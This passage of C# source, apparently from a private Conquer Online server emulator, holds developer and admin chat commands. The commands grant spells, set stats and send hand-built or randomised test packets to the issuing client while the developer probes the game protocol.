                                client.Player.SendUpdate(stream, (uint)client.Player.MainFlag, MsgUpdate.DataType.MainFlag, false);

                            }
                            break;
                        }
                 
                    case "group":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                MsgServer.MsgSameGroupServerList.GroupServer group = new MsgSameGroupServerList.GroupServer();

                                group.Servers = new MsgSameGroupServerList.Server[1];
                                for (int x = 0; x < 1; x++)
                                {

                                    group.Servers[x] = new MsgSameGroupServerList.Server();
                                    group.Servers[x].GroupID = uint.Parse(data[1]);
                                    group.Servers[x].MapID = uint.Parse(data[2]);
                                    group.Servers[x].Name = data[3];
                                    group.Servers[x].X = uint.Parse(data[4]);
                                    group.Servers[x].Y = uint.Parse(data[5]);
                                    group.Servers[x].ServerID = uint.Parse(data[6]);
                                }
                                client.Send(stream.CreateGroupServerList(group));
                            }
                            break;
                        }
                    case "tleag":
                        {


                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int x = 50; x < 100; x++)
                                {
                                    stream.LeagueOptCreate((MsgLeagueOpt.ActionID)x, client.Player.MyUnion.UID, client.Player.UID, (uint)(1 << 8));

                                    client.Send(stream);
                                }
                            }

                            break;
                        }
                    case "learnspells":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                foreach (var spell in Database.Server.Magic.Values)
                                {
                                    if (spell.Keys.Count > 0)
                                    {
                                        var sp = spell[(ushort)(spell.Keys.Count - 1)];
                                        client.MySpells.Add(stream, sp.ID, sp.Level);
                                        System.Threading.Thread.Sleep(2);
                                    }
                                }

                            }
                            break;
                        }
                    case "goldb":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                for (int x = 0; x < 30; x++)
                                    client.Send(stream.HandBrickInfoCreate((MsgHandBrickInfo.BrickInfo)x, 1000, 1000));
                            }
                            //HandBrickInfoCreate
                            break;
                        }
                    case "testupd":
                        {


                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                //   client.Player.SendUpdate(stream, ushort.Parse(data[1]), (MsgUpdate.DataType)90,false);

                                /*  Game.MsgServer.MsgUpdate packet = new Game.MsgServer.MsgUpdate(stream, client.Player.UID, 1);
                                  packet.Append(stream, (MsgUpdate.DataType)uint.Parse(data[1]), ushort.Parse(data[2]), 0, 0, 0);
                               
                                  stream = packet.GetArray(stream);
                                  client.Send(stream);
                                // client.Player.SendUpdate(stream, (MsgUpdate.DataType)uint.Parse(data[1]), 80, 150, 220, false);
                                  */

                                for (int i = 100; i < 110; i++)
                                    for (int x = 50; x < 220; x++)
                                    {

                                        Game.MsgServer.MsgUpdate packet = new Game.MsgServer.MsgUpdate(stream, client.Player.UID, 1);
                                        stream = packet.Append(stream, (MsgUpdate.DataType)i, (uint)x, 30, 300, 300);
                                        stream = packet.GetArray(stream);

                                        client.Player.View.SendView(stream, true);
                                        /*  Game.MsgServer.MsgUpdate update = new Game.MsgServer.MsgUpdate(stream, client.Player.UID, 1);
                                           stream = update.Append(stream, (MsgUpdate.DataType)x, 1, 3, 100, 0);
                                            stream = update.GetArray(stream);
                                            client.Send(stream);
                                            client.Player.SendUpdate(stream, (MsgUpdate.DataType)x, 80, 150, 220, false);
                                            */
                                        //    client.Player.SendUpdate(stream, (MsgUpdate.DataType)x, 80, 150, 220, false);
                                        //  client.Player.SendUpdate(stream, MsgUpdate.Flags.DivineGuard, 15, 0, 0, (MsgUpdate.DataType)uint.Parse(data[1]));

                                        /* Game.MsgServer.MsgUpdate packet = new Game.MsgServer.MsgUpdate(stream, client.Player.UID, 1);
                                       //  stream = packet.Append(stream, (MsgUpdate.DataType)x, uint.Parse(data[1]));
                                         packet.Append(stream, (MsgUpdate.DataType)x,1, 3, 100, 0);
                                         stream = packet.GetArray(stream);
                                         client.Send(stream);*/
                                    }
                                //   //client
                                //     .Send(stream);
                            }
                            break;
                        }
                    case "asd":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                for (int x = 50; x < 200; x++)
                                {
                                    client.Player.AddFlag((MsgUpdate.Flags)171, 10, true, 0);
                                    client.Player.SendUpdate(stream, (Game.MsgServer.MsgUpdate.Flags)171, 60
                        , 1, 4, (MsgUpdate.DataType)x, true);
                                    //      client.Send(stream.GameUpdateCreate(client.Player.UID, (Game.MsgServer.MsgGameUpdate.DataType)x, true, 1, (uint)100, 1));

                                }
                                //client.Send(stream.GameUpdateCreate(client.Player.UID, (Game.MsgServer.MsgGameUpdate.DataType)x, true, 1, (uint)100, 1));

                            }
                            break;
                        }
                    case "exp":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                client.Player.SendUpdate(stream, uint.Parse(data[1]), MsgUpdate.DataType.Experience, false);
                            }
                            break;
                        }
                    case "cd":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                MsgMagicColdTime.MagicColdTime item = new MsgMagicColdTime.MagicColdTime();
                                item.Spells = new MsgMagicColdTime.Spell[1];
                                item.Spells[0] = new MsgMagicColdTime.Spell();
                                item.Spells[0].SpellID = ushort.Parse(data[1]);
                                item.Spells[0].Time = int.Parse(data[2]);
                                //      item.dwparam1 = uint.Parse(data[1]);
                                //    item.dwparam2 = uint.Parse(data[2]);
                                //  item.dwpram3 = uint.Parse(data[3]);
                                client.Send(stream.MagicColdTimeCreate(item));
                            }
                            break;
                        }
                    case "testsinglepacket":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                //   for (int x = 100; x < 200; x++)
                                {
                                    stream.Seek(4);

                                    byte[] pack = new byte[]
                                    {
                                        0x0A ,0x18 ,0x08 ,0x1A ,0x10 ,0xCE ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20     
,0xC1 ,0x03 ,0x28 ,0xB9 ,0x03 ,0x30 ,0x00 ,0x3A ,0x05 ,0x4B ,0x79 ,0x6C ,0x69 ,0x6E ,0x0A ,0x1A 
,0x08 ,0x15 ,0x10 ,0xC9 ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20 ,0xA3 ,0x01 ,0x28 ,0x9F ,0x01 ,0x30   
,0x00 ,0x3A ,0x07 ,0x50 ,0x79 ,0x72 ,0x61 ,0x6D ,0x69 ,0x64 ,0x0A ,0x18 ,0x08 ,0x16 ,0x10 ,0xCA     
,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20 ,0xF7 ,0x01 ,0x28 ,0x94 ,0x01 ,0x30 ,0x00 ,0x3A ,0x05 ,0x48     
,0x65 ,0x62 ,0x62 ,0x79 ,0x0A ,0x1B ,0x08 ,0x17 ,0x10 ,0xCB ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20    
,0xE4 ,0x02 ,0x28 ,0xCE ,0x01 ,0x30 ,0x00 ,0x3A ,0x08 ,0x42 ,0x61 ,0x73 ,0x69 ,0x6C ,0x69 ,0x73     
,0x6B ,0x0A ,0x1A ,0x08 ,0x18 ,0x10 ,0xCC ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20 ,0xBC ,0x03 ,0x28      
,0x87 ,0x02 ,0x30 ,0x00 ,0x3A ,0x07 ,0x46 ,0x72 ,0x65 ,0x65 ,0x64 ,0x6F ,0x6D ,0x0A ,0x18 ,0x08     
,0x19 ,0x10 ,0xCD ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20 ,0xC7 ,0x03 ,0x28 ,0xE8 ,0x02 ,0x30 ,0x00   
,0x3A ,0x05 ,0x48 ,0x6F ,0x6E ,0x6F ,0x72 ,0x0A ,0x17 ,0x08 ,0x1B ,0x10 ,0xCF ,0x87 ,0x01 ,0x18    
,0xDF ,0x1E ,0x20 ,0xE7 ,0x02 ,0x28 ,0xCB ,0x03 ,0x30 ,0x00 ,0x3A ,0x04 ,0x4C ,0x69 ,0x6F ,0x6E    
,0x0A ,0x1B ,0x08 ,0x1C ,0x10 ,0xD0 ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20 ,0x88 ,0x02 ,0x28 ,0xC0      
,0x03 ,0x30 ,0x00 ,0x3A ,0x08 ,0x41 ,0x71 ,0x75 ,0x61 ,0x72 ,0x69 ,0x75 ,0x73 ,0x0A ,0x18 ,0x08     
,0x1D ,0x10 ,0xD1 ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E ,0x20 ,0xB4 ,0x01 ,0x28 ,0xE0 ,0x02 ,0x30 ,0x00   
,0x3A ,0x05 ,0x45 ,0x61 ,0x67 ,0x6C ,0x65 ,0x0A ,0x1C ,0x08 ,0x1E ,0x10 ,0xD2 ,0x87 ,0x01 ,0x18    
,0xDF ,0x1E ,0x20 ,0x9C ,0x01 ,0x28 ,0x8A ,0x02 ,0x30 ,0x00 ,0x3A ,0x09 ,0x4C ,0x69 ,0x67 ,0x68   
,0x74 ,0x6E ,0x69 ,0x6E ,0x67 ,0x0A ,0x19 ,0x08 ,0x67 ,0x10 ,0x80 ,0x87 ,0x01 ,0x18 ,0xDF ,0x1E  
,0x20 ,0xB0 ,0x02 ,0x28 ,0xB4 ,0x02 ,0x30 ,0x01 ,0x3A ,0x06 ,0x52 ,0x65 ,0x61 ,0x6C ,0x6D ,0x33    

                                    };

                                    for (int x = 0; x < pack.Length; x++)
                                        stream.Write((byte)pack[x]);
                                    //        stream.Write(byte.Parse(data[1]));//109576
                                    //        stream.Write((byte)71);
                                    //   stream.Write((uint)uint.Parse(data[2]));
                                    //  stream.Write(0);
                                    //     stream.Write(uint.MaxValue);
                                    //     stream.Write(uint.MaxValue); stream.Write(uint.MaxValue);

                                    stream.Finalize(2501);
                                    client.Send(stream);
                                }
                            }
                            break;
                        }
                    case "testpacket":
                        {

                            /*   for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                               {
                                   ActionQuery test = new ActionQuery();
                                   test.ObjId = client.Player.UID;
                                   test.Type = (ActionType)x;
                                   test.dwParam = uint.Parse(data[3]);
                                   using (var rec = new ServerSockets.RecycledPacket())
                                   {
                                       var stream = rec.GetStream();
                                       stream.ActionCreate(&test);
                                       client.Send(stream);
                                   }
                               }*/
                            for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();

                                    stream.InitWriter();
                                    for (int y = 0; y < 100; y++)
                                    {
                                        stream.Write(Program.GetRandom.Next());
                                    }
                                    stream.Finalize(x);
                                    client.Send(stream);

                                }
                            }
                            break;
                        }
                    case "test":
                        {

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();



                                /*for (ushort y = ushort.Parse(data[1]); y < ushort.Parse(data[2]); y++)
                                {
                                    ActionQuery action = new ActionQuery()
                                    {
                                        ObjId = client.Player.UID,
                                        dwParam = (ushort)12390,
                                        Type = (ActionType)y,
                                        dwParam2 = 12390,
                                        dwParam3 = 12390
                                    };
                                    client.Send(stream.ActionCreate(&action));

                                }*/
                                for (int u = 30; u < 200; u++)
                                {
                                    stream.Seek(4);
                                    stream.Write(Extensions.Time32.Now.Value);
                                    stream.Write(client.Player.UID);
                                    stream.Write(1);

                                    stream.Write(u);//78
                                    stream.Write(620);//173);
                                    stream.Write(172);//0x02);//2
                                    stream.Write(4);//300
                                    for (int x = 0; x < 10; x++)
                                    {
                                        stream.Write(0);
                                    }
                                    stream.Finalize(10017);
                                    client.Send(stream);
                                }
                                /*
                                                                  Game.MsgServer.MsgSpellPacket spell;
                                                                  if (client.MySpells.ClientSpells.TryGetValue((ushort)12390, out spell))
                                                                  {
                                                                      client.Send(stream.SpellCreate(spell));
                                                                  }*/
                            }

                            break;
                        }
                    case "ada":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                                {


                                    InteractQuery inter = new InteractQuery();
                                    inter.AtkType = (MsgAttackPacket.AttackID)x;
                                    inter.OpponentUID = client.Player.UID;
                                    inter.UID = client.Player.UID;
                                    inter.Damage = 3;
                                    inter.dwParam = 3;
                                    inter.SpellID = 12550;
                                    inter.X = client.Player.X;
                                    inter.Y = client.Player.Y;

                                    stream.InteractionCreate(&inter);
                                    client.Send(stream);
                                }

                            }
                            break;
                        }
                    case "tt":
                        {

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.Seek(4);
                                /*3D 00 4D 04 54 A8 CF 05 C0 BB 0D 00 A2 03 00 00      ;= MT¨ÏÀ»
27 01 00 01 19 00 0A 19 00 00 00 0D 2F DB 2E 00      ;'  
89 3A 00 00 03 EA D3 CE 54 4B 16 04 00 41 75 72      ;:  êÓÎTK Aur
6F 72 61 4C 6F 74 75 73 00 00 00 00 00 54 51 53      ;oraLotus     TQS
65 72 76 65 72                                       ;erver*/


                                stream.Write(Extensions.Time32.Now.Value);
                                stream.Write(900032);
                                stream.Write(930);
                                stream.Write(client.Player.X);
                                stream.Write(client.Player.Y);
                                stream.Write((ushort)11);// max life
                                stream.Write((byte)10);//effect
                                stream.Write(10);//25 life

                                stream.Write((byte)13);//13
                                stream.Write(3070767);//3070767 owner ui
                                stream.Write((uint)14985);//14985   guild id
                                //03 EA D3 CE 54 4B 16 04 00
                                /*  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);
                                  stream.Write((byte)0);*/

                                stream.Write((byte)2);
                                // stream.Write(1422840810);
                                // stream.Write(267851);

                                //stream.Write(Extensions.Time32.Now.Value);
                                //  stream.Write(7000000);

                                //(uint)(CountDownEnd - new DateTime(1970, 1, 1).ToLocalTime()).TotalSeconds


                                var now = DateTime.Now.AddSeconds(7);
                                //Console.WriteLine(now.DayOfYear);
                                var year = (ulong)(10000000000000 * (now.Year - 2015));
                                var vallll = (ulong)(now.Day * 1000000);
                                var hh = (ulong)(now.Hour * 10000);
                                var min = (ulong)(now.Minute * 100);
                                var sec = (ulong)(now.Second);

                                stream.Write(Role.Core.TqTimer(DateTime.Now.AddSeconds(9)));//(ulong)(1150412700000000 + vallll + hh + min + sec));


                                //(ulong)(now.Year * 365 * 24 * 60 * 60);

                                //1150412708041706
                                //1150412700000000

                                ulong val = (ulong)((ulong)now.Year * 365 * 24 * 60 * 60 + (ulong)now.Month * 30 * 24 * 60 * 60 + (ulong)now.Day * 24 * 60 * 60 + (ulong)now.Hour * 60 * 60 + (ulong)now.Minute * 60);// + now.Second + 7);
                                val += (ulong)(now.Second + 7 + 1106220010000099);



                                /*     DateTime CountDownEnd = DateTime.Now.AddSeconds(6);
                                     var tt1 = new TimeSpan(CountDownEnd.Ticks);
                                     var ttw = new TimeSpan(new DateTime(2000, 1, 1).ToLocalTime().Ticks);
                                     var timerur = tt1.Ticks - ttw.Ticks;

                                       ulong timer = (ulong)(CountDownEnd - new DateTime(1990, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;




                                       stream.Write((ulong)timerur - 10000000000000000);//1150589909091228);
                                      /* DateTime CountDownEnd = DateTime.Now.AddSeconds(6);
                                       ulong timer = (ulong)(CountDownEnd - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).ToLocalTime()).TotalMilliseconds;
                               
                                       stream.Write(timer);
                                       //stream.Write(267851);*/

                                /*ulong totalMinutes = (ulong)(DateTime.UtcNow - new DateTime(2001, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
                                  stream.Write((ulong)totalMinutes);
                                  */



                                DateTime pointOfReference = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                                long ticks = (long)(1150916909041706 / 3);
                                var atimer = new DateTime(2014, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddTicks(ticks);



                                /*stream.Write((byte)0x4b);
                                 stream.Write((byte)0x16);
                                 stream.Write((byte)0x04);
                                 stream.Write((byte)0x00);*/

                                /*   DateTime date = DateTime.Now;
                                   DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, 0);
                                   TimeSpan span = (date - epoch);
                                   double unixTime = span.TotalSeconds;


                                   */

                                /*
                                stream.Write((byte)0xea);//ea
                                stream.Write((byte)30);//d3
                                stream.Write((byte)0xce);//ce
                                stream.Write((byte)0x54);//54
                                stream.Write((byte)0x4b);//4b
                                stream.Write((byte)0x16);
                                stream.Write((byte)0x04);//4
                                stream.Write((byte)0x00);
                        */

                                /*   stream.Write((byte)1);//ea
                                   stream.Write((byte)0);//d3
                                   stream.Write((byte)0);//ce
                                   stream.Write((byte)0);//54
                                   stream.Write((byte)0x4b);//4b
                                   stream.Write((byte)0x16);
                                   stream.Write((byte)0x04);
                                   stream.Write((byte)0x01);*/

                                string str = "AuroraLotus";
                                stream.Write(str, str.Length);

                                stream.Finalize(1101);
                                client.Send(stream);
                            }
                            break;
                        }

                    case "tttt":
                        {
                            MsgTournaments.MsgSchedules.SendInvitation("GuildWar", "ConquerPoints", 200, 254, 1038, 0, 60, MsgServer.MsgStaticMessage.Messages.GuildWar);
                            break;
                        }
                    case "reborn":
                        {
                            client.Player.Reborn = byte.Parse(data[1]);
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SendUpdate(stream, client.Player.Reborn, MsgUpdate.DataType.Reborn);
                            }
                            break;
                        }
                    case "class":
                        {
                            client.Player.Class = byte.Parse(data[1]);
                            break;
                        }
                }
                return true;
            }
            return false;
        }

    }
}
